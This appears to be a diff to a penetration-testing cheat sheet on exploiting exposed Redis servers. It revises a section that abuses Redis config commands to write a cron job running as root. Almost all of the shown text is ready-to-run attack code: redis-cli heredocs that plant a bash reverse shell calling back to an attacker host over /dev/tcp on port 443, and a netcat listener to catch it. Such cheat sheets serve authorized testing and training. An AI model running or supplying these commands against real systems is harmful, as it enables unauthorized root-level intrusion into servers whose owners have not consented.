@@ -46,15 +46,25 @@ EOF
 ssh -i ./k <user>@$IP
 ```
 
-## 🅲 Cron reverse shell (Debian/Ubuntu)
+## 🅲 Cron reverse shell (needs redis write perms to a cron path)
+**`/etc/cron.d/` — the file *does* take a user field** (and must end with a newline):
 ```bash
 redis-cli -h $IP <<'EOF'
-config set dir /var/spool/cron/crontabs   # or /etc/cron.d
-config set dbfilename <user>
-set x "\n\n* * * * * <user> bash -c 'bash -i >& /dev/tcp/<KALI>/443 0>&1'\n\n"
+config set dir /etc/cron.d
+config set dbfilename shell
+set x "\n\n* * * * * root bash -c 'bash -i >& /dev/tcp/<KALI>/443 0>&1'\n\n"
 save
 EOF
-# listener: nc -lvnp 443   (needs redis write perms to the cron path)
+```
+**Per-user crontab (`/var/spool/cron/crontabs/<user>` on Debian/Ubuntu, `/var/spool/cron/<user>` on RHEL) — NO user field:**
+```bash
+redis-cli -h $IP <<'EOF'
+config set dir /var/spool/cron/crontabs
+config set dbfilename root
+set x "\n\n* * * * * bash -c 'bash -i >& /dev/tcp/<KALI>/443 0>&1'\n\n"
+save
+EOF
+# listener: nc -lvnp 443
 ```
 
 ## 🅳 Module / replication RCE (Redis 4.x–5.x — no writable path needed)
